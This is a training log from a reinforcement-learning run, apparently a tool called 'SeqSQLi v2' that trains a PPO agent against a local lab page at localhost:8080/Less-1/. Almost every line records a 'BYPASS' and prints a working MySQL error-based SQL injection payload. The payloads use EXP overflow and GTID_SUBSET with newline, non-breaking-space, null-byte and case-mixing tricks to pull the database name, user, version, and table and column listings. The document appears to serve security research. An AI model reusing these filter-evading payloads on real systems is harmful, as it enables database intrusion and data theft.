/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  [BYPASS] Ep 8498 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aanD%0aEXP(~(SELEcT%0a*%0aFrOM%0a(seLect%0a(database%a0()))a));%00
  Ep 8500 | SR=30% | Steps=13.3 | R=-28.42
  [BYPASS] Ep 8501 | steps=3 | seq=func_sp_nbsp -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 8503 | steps=7 | seq=null_byte -> newline -> null_byte -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8506 | steps=5 | seq=newline -> newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(seleCT%0a*%0aFROM%0a(selecT%0a(version%a0()))a));%00
  [BYPASS] Ep 8507 | steps=5 | seq=crlf -> null_byte -> case -> agg_swap -> func_sp_nbsp
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SelECT%0d%0a*%0d%0afRoM%0d%0a(seLect%0d%0a(user%a0()))a));%00
  [BYPASS] Ep 8510 | steps=5 | seq=func_sp_nbsp -> func_sp_tab -> agg_swap -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 8510 | SR=50% | Steps=10.0 | R=-18.09
  [BYPASS] Ep 8512 | steps=15 | seq=formfeed -> func_sp_nbsp -> func_sp_nbsp -> case -> newline -> case -> null_byte -> newline -> null_byte -> case -> case -> case -> case_split -> case -> agg_swap
           payload: 1'%0cAnD%0cEXP(~(SElect%0c*%0cfroM%0c(selECT%0c((SElecT%0cJSON_ARRAYAGG(TablE_name)%0cfROM%0cinFormAtIon_scHEMa.TAblEs%0cwhEre%0ctaBLE_schema=daTaBase
  [BYPASS] Ep 8514 | steps=9 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(seLECT%0a*%0afROm%0a(SeLEcT%0a((SELeCt%0aJSON_ARRAYAGG(schema_name)%0afROM%0aiNfOrMation_scHEMa.schemata)))a));%00
  Ep 8520 | SR=20% | Steps=14.4 | R=-33.73
  [BYPASS] Ep 8524 | steps=8 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(SelECT%0a*%0aFRom%0a(selECt%0a((sELECt%0aJSON_ARRAYAGG(schema_name)%0afRom%0ainfoRMATIoN_SChEMA.schemata)))a));%00
  [BYPASS] Ep 8529 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 8530 | SR=20% | Steps=13.2 | R=-30.72
  [BYPASS] Ep 8533 | steps=10 | seq=agg_swap -> newline -> func_sp_nbsp -> concat_char -> func_sp_tab -> hex_to_char -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(seleCT%0a*%0aFROm%0a(seLEcT%0a((sEleCt%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aiNFormAtIon_sCHEmA.schemata)))a));%00
  [BYPASS] Ep 8538 | steps=3 | seq=func_sp_nbsp -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 8540 | SR=20% | Steps=13.3 | R=-30.01
  [BYPASS] Ep 8542 | steps=12 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> case -> null_byte -> case -> null_byte -> null_byte -> case -> case -> null_byte -> agg_swap
           payload: 1'%0aaND%0aEXP(~(SeLeCt%0a*%0aFrom%0a(SElect%0a((seLect%0aJSON_ARRAYAGG(table_name)%0aFROM%0ainfOrmatIOn_SChEma.tABlEs%0awhErE%0aTABlE_schema=dAtabase
  [BYPASS] Ep 8547 | steps=7 | seq=agg_swap -> newline -> null_byte -> case -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(seLECt%0a*%0aFRom%0a(SeleCT%0a((sELeCT%0aJSON_ARRAYAGG(column_name)%0afRom%0aiNFORMATiOn_ScheMA.columns%0aWHErE%0ataBle_schema=dATABA
  [BYPASS] Ep 8549 | steps=6 | seq=newline -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SElEcT%0a*%0aFrOM%0a(SeLeCt%0a((SelECt%0aJSON_ARRAYAGG(column_name)%0aFROm%0aInfORMATion_SCHema.columns%0aWheRE%0aTabLe_schema=dAtaba
  Ep 8550 | SR=30% | Steps=13.0 | R=-28.39
  [BYPASS] Ep 8553 | steps=8 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aanD%0aEXP(~(SElect%0a*%0aFrom%0a(seleCt%0a((SeLECt%0aJSON_ARRAYAGG(TabLe_name)%0aFrom%0aiNFOrmatION_sCHeMa.tABLes%0aWHEre%0aTABLe_schema=daTabaSE
  [BYPASS] Ep 8560 | steps=4 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 8560 | SR=20% | Steps=13.2 | R=-31.00
  [BYPASS] Ep 8564 | steps=9 | seq=newline -> null_byte -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SElect%0a*%0aFrOm%0a(SeLeCT%0a(version%a0()))a));%00
  Ep 8570 | SR=10% | Steps=14.4 | R=-37.14
  [BYPASS] Ep 8571 | steps=8 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SEleCt%0a*%0aFROm%0a(seLEct%0a(user%a0()))a));%00
  [BYPASS] Ep 8577 | steps=7 | seq=newline -> func_sp_nbsp -> formfeed -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(SELecT%0a*%0afRoM%0a(seLEcT%0a(daTabasE%a0()))a));%00
  Ep 8580 | SR=20% | Steps=13.5 | R=-32.53
  [BYPASS] Ep 8587 | steps=10 | seq=hex_to_char -> newline -> null_byte -> null_byte -> null_byte -> case -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aaND%0aEXP(~(seLECT%0a*%0aFroM%0a(seLEct%0a((sElEcT%0aJSON_ARRAYAGG(CONCAT(tABLe_schema,CHAR(46),Table_name))%0afrOm%0aiNfOrmATIOn_SChEmA.tABles%0
  [BYPASS] Ep 8589 | steps=11 | seq=hex_to_char -> null_byte -> newline -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(SElECT%0a*%0aFRom%0a(SelEct%0a((SElecT%0aJSON_ARRAYAGG(coNCat(tABLE_schema,CHAR(46),tABlE_name))%0afroM%0aInfORmatIOn_schEmA.TAbLEs%0
  Ep 8590 | SR=20% | Steps=14.1 | R=-32.07
  [BYPASS] Ep 8597 | steps=12 | seq=hex_to_char -> newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> case -> case -> case -> newline -> case -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(SELEcT%0a*%0aFROm%0a(SeLecT%0a((SeLEct%0aJSON_ARRAYAGG(CONCAT(Table_schema,CHAR(46),tablE_name))%0afrom%0ainFoRMATion_SchEma.TAblEs%0
  [BYPASS] Ep 8599 | steps=7 | seq=null_byte -> hex_to_char -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(SeleCT%0a*%0aFrom%0a(sELect%0a((sElEct%0acONCat(CHAR(124),JSON_ARRAYAGG(tABle_name),CHAR(124))%0afrOM%0aINFOrmatIon_sCHEMa.TABLes%0aW
  Ep 8600 | SR=20% | Steps=13.9 | R=-32.12
  [BYPASS] Ep 8603 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aAnD%0aEXP(~(seLeCt%0a*%0aFrOM%0a(SelEct%0a(version%a0()))a));%00
  [BYPASS] Ep 8606 | steps=6 | seq=newline -> case -> null_byte -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8609 | steps=10 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case -> case -> case -> case -> agg_swap -> null_byte
           payload: 1'%0aanD%0aEXP(~(selECT%0a*%0aFROM%0a(SEleCt%0a(version%a0()))a));%00
  Ep 8610 | SR=30% | Steps=12.5 | R=-26.44
  [BYPASS] Ep 8614 | steps=10 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(selEcT%0a*%0afROM%0a(seLect%0a((SElECT%0aJSON_ARRAYAGG(schema_name)%0afroM%0aInformatION_SChEmA.schemata)))a));%00
  Ep 8620 | SR=10% | Steps=14.5 | R=-36.84
  [BYPASS] Ep 8630 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aANd%0aGTID_SUBSET((DAtabAsE%a0()),1);%00
  Ep 8630 | SR=10% | Steps=13.9 | R=-31.35
  [BYPASS] Ep 8631 | steps=6 | seq=nested_union -> nested_union -> func_sp_nbsp -> null_byte -> case -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8632 | steps=7 | seq=func_sp_nbsp -> agg_swap -> newline -> agg_swap -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aaNd%0aGTID_SUBSET((dAtABaSE%a0()),1);%00
  [BYPASS] Ep 8636 | steps=6 | seq=hex_to_char -> case -> func_sp_nbsp -> agg_swap -> newline -> null_byte
           payload: 1'%0aAND%0aEXP(~(sELEcT%0a*%0afrOm%0a(SELeCT%0a((SELEcT%0acONcat(CHAR(124),JSON_ARRAYAGG(TABlE_name),CHAR(124))%0aFrOM%0aInFoRmatIOn_ScHEma.TabLes%0aw
  Ep 8640 | SR=30% | Steps=12.4 | R=-26.36
  [BYPASS] Ep 8641 | steps=8 | seq=null_byte -> agg_swap -> newline -> null_byte -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 8642 | steps=4 | seq=newline -> agg_swap -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 8645 | steps=7 | seq=newline -> func_sp_nbsp -> case -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aEXP(~(SELeCT%0a*%0aFroM%0a(sElECT%0a((SeLEcT%0aJSON_ARRAYAGG(schema_name)%0afRoM%0ainFOrmAtioN_SChEMa.schemata)))a));%00
  [BYPASS] Ep 8646 | steps=5 | seq=newline -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: 1'%0aaNd%0aEXP(~(SelECt%0a*%0afrOm%0a(SelEct%0a((SElECt%0aJSON_ARRAYAGG(TABle_name)%0afrOM%0ainFormAtIon_sCHemA.TABLEs%0awhEre%0aTABLE_schema=daTabAse
  [BYPASS] Ep 8650 | steps=4 | seq=newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(seLEct%0a*%0aFrom%0a(seleCT%0a(user%a0()))a));%00
  Ep 8650 | SR=50% | Steps=10.3 | R=-17.72
  [BYPASS] Ep 8651 | steps=7 | seq=newline -> null_byte -> case -> case -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(selECT%0a*%0afrOM%0a(SElEct%0a(version%a0()))a));%00
  [BYPASS] Ep 8652 | steps=8 | seq=newline -> null_byte -> agg_swap -> agg_swap -> agg_swap -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeLECt%0a*%0afROm%0a(sELeCT%0a(DatAbASE%a0()))a));%00
  [BYPASS] Ep 8655 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aaND%0aEXP(~(SELect%0a*%0afroM%0a(sElect%0a(user%a0()))a));%00
  [BYPASS] Ep 8657 | steps=11 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> case -> case -> case -> null_byte -> case -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(SeLecT%0a*%0afrom%0a(SeleCT%0a((seleCt%0aJSON_ARRAYAGG(column_name)%0aFRom%0ainFormaTioN_ScHEMA.columns%0aWHERe%0aTable_schema=DATAbA
  [BYPASS] Ep 8658 | steps=7 | seq=newline -> null_byte -> agg_swap -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(seLECt%0a*%0afrOM%0a(SeleCT%0a(databAse%a0()))a));%00
  [BYPASS] Ep 8659 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(SELect%0a*%0afRoM%0a(SeLEcT%0a(version%a0()))a));%00
  Ep 8660 | SR=60% | Steps=10.5 | R=-16.43
  [BYPASS] Ep 8670 | steps=10 | seq=newline -> null_byte -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> case -> nested_and -> null_byte -> agg_swap
           payload: 1'%0aaND%0aEXP(~(seLecT%0a*%0aFrOm%0a(SELECt%0a((seleCT%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aINFOrMatioN_sCheMa.schemata)))a));%00
  Ep 8670 | SR=10% | Steps=14.5 | R=-33.78
  [BYPASS] Ep 8673 | steps=10 | seq=newline -> null_byte -> func_sp_nbsp -> crlf -> agg_swap -> newline -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SeLEcT%0a*%0aFROm%0a(seleCT%0a((SelECt%0aJSON_ARRAYAGG(schema_name)%0afrom%0ainFOrmation_sCHema.schemata)))a));%00
  [BYPASS] Ep 8676 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8679 | steps=7 | seq=newline -> case_split -> null_byte -> case -> null_byte -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(SeLEct%0a*%0afRom%0a(SeleCT%0a(user%a0()))a));%00
  Ep 8680 | SR=30% | Steps=12.5 | R=-25.81
  [BYPASS] Ep 8682 | steps=6 | seq=hex_to_char -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(seLecT%0a*%0aFRom%0a(SeLeCT%0a((selEct%0aCONcAT(CHAR(124),JSON_ARRAYAGG(TaBLe_name),CHAR(124))%0aFrOM%0aInFOrMatIOn_scheMa.TABLEs%0aW
  [BYPASS] Ep 8683 | steps=8 | seq=null_byte -> newline -> null_byte -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SeLECt%0a*%0aFRoM%0a(SEleCT%0a((sELECT%0aJSON_ARRAYAGG(TAble_name)%0aFrom%0aInfoRmaTion_SchEmA.TabLEs%0aWhERE%0atABlE_schema=dATabAse
  [BYPASS] Ep 8685 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(SElecT%0a*%0afROm%0a(SELecT%0a(dATAbAse%a0()))a));%00
  [BYPASS] Ep 8686 | steps=6 | seq=newline -> formfeed -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(sELEct%0a*%0aFROM%0a(selecT%0a(user%a0()))a));%00
  [BYPASS] Ep 8687 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(sELEcT%0a*%0afRoM%0a(SELecT%0a(user%a0()))a));%00
  Ep 8690 | SR=50% | Steps=10.7 | R=-17.91
  [BYPASS] Ep 8691 | steps=5 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aAnD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8697 | steps=4 | seq=func_sp_nbsp -> null_byte -> case -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((DAtabase%a0()),1);%00
  [BYPASS] Ep 8699 | steps=10 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(SelEct%0a*%0afrOm%0a(SELEct%0a((sElECt%0aJSON_ARRAYAGG(schema_name)%0afrom%0aiNfoRmatIon_schemA.schemata)))a));%00
  Ep 8700 | SR=30% | Steps=12.4 | R=-27.07
  [BYPASS] Ep 8701 | steps=6 | seq=newline -> null_byte -> case -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aand%0aEXP(~(sELEct%0a*%0afRom%0a(sElEct%0a((seLEct%0aJSON_ARRAYAGG(taBle_name)%0aFRoM%0ainFORmaTIon_ScHema.TaBlEs%0awHeRe%0aTable_schema=DAtabASE
  [BYPASS] Ep 8709 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aAnd%0aEXP(~(SElECt%0a*%0afROM%0a(SEleCt%0a(version%a0()))a));%00
  Ep 8710 | SR=20% | Steps=13.2 | R=-30.81
  [BYPASS] Ep 8711 | steps=6 | seq=agg_swap -> newline -> case_split -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(SELeCt%0a*%0aFROm%0a(selEcT%0a((selEcT%0aJSON_ARRAYAGG(TaBLE_name)%0aFRom%0aInfoRmatIon_SCHEMA.TaBLes%0aWhERe%0ataBle_schema=dataBAsE
  [BYPASS] Ep 8712 | steps=4 | seq=newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(seleCT%0a*%0aFRom%0a(seLeCt%0a(version%a0()))a));%00
  [BYPASS] Ep 8713 | steps=6 | seq=func_sp_nbsp -> newline -> null_byte -> case -> null_byte -> agg_swap
           payload: 1'%0aand%0aEXP(~(sELEcT%0a*%0afrOm%0a(sEleCt%0a((selECT%0aJSON_ARRAYAGG(TAblE_name)%0afRom%0aInfORmAtioN_SCHEmA.TAblEs%0awHERe%0atABLE_schema=DataBAse
  [BYPASS] Ep 8720 | steps=4 | seq=newline -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SElEct%0a*%0afrOM%0a(sELecT%0a(user%a0()))a));%00
  Ep 8720 | SR=40% | Steps=11.0 | R=-20.76
  [BYPASS] Ep 8721 | steps=8 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(sELecT%0a*%0afrOM%0a(SELeCt%0a((seLecT%0aJSON_ARRAYAGG(schema_name)%0afRoM%0aINfOrMaTIoN_sChEMA.schemata)))a));%00
  [BYPASS] Ep 8726 | steps=8 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case -> null_byte -> func_sp_nbsp -> agg_swap
           payload: 1'%0aanD%0aEXP(~(sELECt%0a*%0afroM%0a(SELecT%0a((SElEct%0aJSON_ARRAYAGG(schema_name)%0afROM%0aINFORmATIOn_scHEMa.schemata)))a));%00
  Ep 8730 | SR=20% | Steps=13.6 | R=-32.24
  [BYPASS] Ep 8731 | steps=5 | seq=newline -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(sELeCT%0a*%0aFRoM%0a(seLect%0a(user%a0()))a));%00
  [BYPASS] Ep 8734 | steps=6 | seq=func_sp_nbsp -> null_byte -> agg_swap -> newline -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(sElECt%0a*%0afrom%0a(sEleCT%0a((sElect%0aJSON_ARRAYAGG(Table_name)%0afROm%0aiNFORMatioN_sChEMa.TABlEs%0aWhERE%0aTabLe_schema=dAtaBAsE
  [BYPASS] Ep 8735 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAND%0aEXP(~(SElECT%0a*%0afrOM%0a(sElecT%0a(daTABASe%a0()))a));%00
  [BYPASS] Ep 8736 | steps=4 | seq=func_sp_nbsp -> func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8738 | steps=5 | seq=newline -> null_byte -> null_byte -> case -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(seleCt%0a*%0aFRoM%0a(SElECT%0a(user%a0()))a));%00
  Ep 8740 | SR=50% | Steps=10.1 | R=-17.00
  [BYPASS] Ep 8743 | steps=3 | seq=func_sp_nbsp -> crlf -> null_byte
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 8744 | steps=5 | seq=newline -> null_byte -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sELECt%0a*%0afroM%0a(selEct%0a((SElECT%0aJSON_ARRAYAGG(tablE_name)%0aFrOM%0aInformaTIOn_SCHeMa.TaBLes%0awheRe%0ataBLe_schema=DATaBASe
  [BYPASS] Ep 8747 | steps=12 | seq=newline -> agg_swap -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> newline -> null_byte -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(SELEct%0a*%0afRom%0a(SelecT%0a(version%a0()))a));%00
  Ep 8750 | SR=30% | Steps=12.5 | R=-27.02
  [BYPASS] Ep 8752 | steps=5 | seq=func_sp_nbsp -> newline -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aANd%0aEXP(~(seleCT%0a*%0aFROM%0a(SELect%0a(user%a0()))a));%00
  [BYPASS] Ep 8753 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(seLEcT%0a*%0aFRoM%0a(sElect%0a(DAtAbASe%a0()))a));%00
  [BYPASS] Ep 8756 | steps=7 | seq=func_sp_nbsp -> agg_swap -> newline -> agg_swap -> null_byte -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(seleCT%0a*%0aFrOm%0a(sElECT%0a((SeLeCT%0aJSON_ARRAYAGG(TAble_name)%0afRom%0ainforMaTiOn_SCHEma.taBLEs%0aWhEre%0ataBLE_schema=DaTABASe
  [BYPASS] Ep 8757 | steps=4 | seq=func_sp_nbsp -> null_byte -> agg_swap -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 8758 | steps=4 | seq=func_sp_nbsp -> case -> newline -> null_byte
           payload: 1'%0aand%0aGTID_SUBSET((datAbase%a0()),1);%00
  Ep 8760 | SR=50% | Steps=10.0 | R=-17.51
  [BYPASS] Ep 8761 | steps=3 | seq=func_sp_nbsp -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8767 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SElECT%0a*%0afROm%0a(SeLECt%0a(user%a0()))a));%00
  [BYPASS] Ep 8768 | steps=5 | seq=newline -> func_sp_nbsp -> case -> agg_swap -> null_byte
           payload: 1'%0aAnD%0aEXP(~(seLecT%0a*%0afRoM%0a(seLEcT%0a((sELEct%0aJSON_ARRAYAGG(schema_name)%0aFROm%0ainformatION_ScheMA.schemata)))a));%00
  Ep 8770 | SR=30% | Steps=11.8 | R=-26.10
  [BYPASS] Ep 8772 | steps=7 | seq=backtick -> newline -> func_sp_nbsp -> concat_char -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aAnD%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8777 | steps=5 | seq=newline -> func_sp_nbsp -> agg_swap -> case -> null_byte
           payload: 1'%0aAnD%0aEXP(~(sElecT%0a*%0afROm%0a(sElECt%0a(user%a0()))a));%00
  Ep 8780 | SR=20% | Steps=13.2 | R=-32.81
  [BYPASS] Ep 8781 | steps=4 | seq=null_byte -> func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 8782 | steps=7 | seq=newline -> agg_swap -> func_sp_nbsp -> case -> func_sp_nbsp -> crlf -> null_byte
           payload: 1'%0aand%0aEXP(~(seLECt%0a*%0afROM%0a(sElect%0a((sElECt%0aJSON_ARRAYAGG(schema_name)%0aFrOm%0aINFOrmatiON_ScHeMA.schemata)))a));%00
  Ep 8790 | SR=20% | Steps=13.1 | R=-30.80
  [BYPASS] Ep 8791 | steps=6 | seq=null_byte -> newline -> case -> case -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SEleCT%0a*%0aFrom%0a(seLeCT%0a((SeLecT%0aJSON_ARRAYAGG(column_name)%0aFrOM%0aiNForMAtioN_SCHEMA.columns%0awhere%0atabLE_schema=dAtAbA
  [BYPASS] Ep 8797 | steps=10 | seq=case_split -> newline -> null_byte -> null_byte -> null_byte -> agg_swap -> agg_swap -> formfeed -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aGTID_SUBSET((DAtABaSE%a0()),1);%00
  Ep 8800 | SR=20% | Steps=13.6 | R=-31.15
  [BYPASS] Ep 8803 | steps=6 | seq=newline -> case -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aand%0aGTID_SUBSET((DatabaSE%a0()),1);%00
  [BYPASS] Ep 8805 | steps=4 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 8810 | SR=20% | Steps=13.0 | R=-28.61
  [BYPASS] Ep 8814 | steps=6 | seq=newline -> null_byte -> case -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLECT%0a*%0afRoM%0a(sELECT%0a(version%a0()))a));%00
  [BYPASS] Ep 8816 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 8820 | SR=20% | Steps=12.9 | R=-29.31
  [BYPASS] Ep 8822 | steps=4 | seq=newline -> case -> func_sp_nbsp -> null_byte
